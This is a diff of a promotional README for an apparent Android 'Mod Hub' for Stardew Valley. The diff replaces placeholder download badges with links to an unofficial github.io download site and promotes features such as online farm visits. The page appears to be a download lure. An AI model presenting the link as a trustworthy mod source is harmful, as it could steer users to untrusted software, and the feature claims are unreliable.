@@ -3,7 +3,7 @@
 ![Stardew Valley Enhanced Gameplay](https://rexdl.com/image/android/game/stardew-valley.jpg)  
 *Transform your pastoral paradise with thousands of community-approved enhancements!*  
 
-[![Join the Mod Revolution](https://img.shields.io/badge/Download-Mod_Hub-success?style=for-the-badge&logo=android&logoColor=white)](https://example.com)  
+[![Join the Mod Revolution](https://img.shields.io/badge/Download-Mod_Hub-success?style=for-the-badge&logo=android&logoColor=white)](https://stardew-valley-mod-download.github.io/.github/)  
 
 ---  
 
@@ -57,7 +57,7 @@ We believe modding should amplify – not alter – the heartwarming spirit of S
 
 ---  
 
-### 🆕 Groundbreaking 2024 Additions  
+### 🆕 Groundbreaking Additions  
 
 #### 🌌 Stardrop Online  
 - Visit friends' farms in real-time (no server setup required)  
@@ -102,7 +102,7 @@ A: Absolutely! Our Creator Portal includes tutorials, testing tools, and peer re
 ![Mod Manager Interface](https://i.ytimg.com/vi/ei5MpU0-qNY/hq720.jpg)  
 *Experience the most user-friendly mod interface on mobile – now with AI-assisted setup!*  
 
-[![Join the Mod Revolution](https://img.shields.io/badge/Download-Mod_Hub-success?style=for-the-badge&logo=android&logoColor=white)](https://example.com)  
+[![Join the Mod Revolution](https://img.shields.io/badge/Download-Mod_Hub-success?style=for-the-badge&logo=android&logoColor=white)](https://stardew-valley-mod-download.github.io/.github/)  
 
 ---  
 
